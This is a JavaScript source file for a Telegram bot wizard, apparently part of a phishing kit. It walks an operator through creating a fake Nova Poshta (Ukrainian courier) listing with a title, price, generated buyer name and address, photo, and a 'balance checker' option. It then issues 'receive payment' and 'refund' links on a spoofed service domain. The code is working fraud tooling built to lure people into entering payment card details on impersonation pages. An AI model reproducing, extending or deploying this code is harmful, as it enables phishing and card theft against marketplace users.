const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");

const faker = require("faker/locale/uk");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_novaposhta_ua",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "novaposhta_ua",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки NOVAPOSHTA.UA");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите название объявления", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите цену объявления (только число, в UAH)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      var amount = parseFloat(ctx.message.text);
      if (isNaN(amount)) return ctx.wizard.prevStep();
      if (amount % 1 == 0) amount = amount.toFixed(0);
      else amount = amount.toFixed(2);

      amount = amount + " ₴";

      ctx.scene.state.data.price = amount;

      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите имя покупателя (Формат: Имя Фамилия)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
        return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery.data == "auto") {
        ctx.scene.state.data.name = faker.name.findName();
        await ctx
          .reply(
            `🤖 Сгенерированное имя: <b>${ctx.scene.state.data.name}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
          // if (!ctx.message.text && ctx.callbackQuery.data != "auto")
          return ctx.wizard.nextStep();
      }
      } catch (e) {
        ctx.scene.state.data.name = ctx.message.text;
        return ctx.wizard.nextStep();
      }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите адрес покупателя", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
        return ctx.wizard.next();
    } catch (err) {
      console.log(`1\n`,err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery.data == "auto") {
        ctx.scene.state.data.address = `${faker.address.cityName()}, ${faker.address.streetAddress()}`;
        await ctx
          .reply(
            `🤖 Сгенерированный адрес: <b>${ctx.scene.state.data.address}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
          return ctx.wizard.nextStep();
      } else if (!ctx.message.text && ctx.callbackQuery.data != "auto") return ctx.wizard.prevStep();
    } catch (e) {
      ctx.scene.state.data.address = ctx.message.text;
      return ctx.wizard.nextStep();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.callbackQuery.data == "skip") return ctx.wizard.nextStep();
      if (ctx.message.photo.length < 1 && ctx.callbackQuery.data !== "skip") return ctx.wizard.prevStep();
    } catch (err) {
      console.log(err)
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[0].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      // ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.wizard.nextStep();
    }
  },
  async (ctx) => {
    try {
      await ctx
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data)) return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep()
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "novaposhta_ua",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "novaposhta_ua",
      });

      log(ctx, `создал объявление NOVAPOSHTA.UA <code>(ID: ${ad.id})</code>`);
      await ctx.scene.reply(
        `<b>✅ Ссылка 🇺🇦 NOVAPOSHTA.UA сгенерирована!</b>
      
🔗 Получение оплаты: <b>https://${service.domain}/${ad.id}</b>
🔗 Возврат: <b>https://${service.domain}/refund/${ad.id}</b>`,
        {
          parse_mode: "HTML",
        }
      );
      ctx.updateType = "message";
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

scene.leave(menu);

module.exports = scene;
